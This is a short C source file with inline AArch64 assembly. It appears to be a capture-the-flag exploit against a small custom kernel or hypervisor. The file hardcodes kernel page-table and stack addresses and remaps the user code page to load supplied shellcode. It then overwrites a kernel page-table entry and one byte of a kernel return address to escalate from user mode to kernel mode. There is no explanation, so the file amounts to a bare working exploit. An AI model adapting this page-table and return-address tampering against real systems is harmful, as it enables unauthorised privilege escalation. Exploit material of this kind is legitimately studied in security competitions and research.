//debug is func delcare;
typedef unsigned long size_t;
void main();
int (*puts)(const char *str) = 0x401A00;
void (*getchar)() = 0x400D24;
void (*read)(int fd, void *buf, size_t count) = 0x401B50;
void (*mprotect)(void *addr, size_t len, int prot) = 0x401B68;
size_t el0_base_va = 0x400000;
size_t el1_base_va = 0xFFFFFFFFC0000000;
size_t el0_base_pte = 0xffffffffc0023000;
size_t el1_base_pte = 0xffffffffc001e000;
size_t el0_base_pa = 0x2c000;
size_t el1_base_pa = 0;
size_t stack_ret_addr = 0xffffffffc0019bb8;
int _start(){
    main();
    return 0;
}

static unsigned long long int svc(unsigned long long int svc_fid, unsigned long long int arg1, unsigned long long int arg2, unsigned long long int arg3){
    unsigned long long int ret;
    asm volatile (
        "mov x8, %1\n\t"
        "mov x0, %2\n\t"
        "mov x1, %3\n\t"
        "mov x2, %4\n\t"
        "svc #0\n\t"
        : "=r" (ret)
        : "r" (svc_fid), "r" (arg1) , "r" (arg2) ,"r" (arg3) 
        : "x0","memory"
    );
    return ret;
}
void debug(){
    long long int ret = svc(0xFF000007,0,0,0);
}

void get_idx(size_t addr,size_t *pgd, size_t *pud, size_t *pmd, size_t *pte){
    *pgd = (addr >> 39) & 0x1FF;
    *pud = (addr >> 30) & 0x1FF;
    *pmd = (addr >> 21) & 0x1FF;
    *pte = (addr >> 12) & 0x1FF;
}

void memcpy(size_t dst,size_t src,size_t len){
    size_t i;
    for(i = 0; i < len; i++){
        *(char *)(dst + i) = *(char *)(src + i);
    }
}

void readn(size_t addr,size_t size){
    for(int i = 0; i < size; i++){
        read(0, addr + i, 1);
    }
}

void main(){
    mprotect(el0_base_va, 0x1000, 3);
    readn(el0_base_va, 0xff0);
    mprotect(el0_base_va, 0x1000, 5);
    readn(el1_base_pte, 8);
    debug();
    read(0, stack_ret_addr+1, 1);
    while(1) ;
}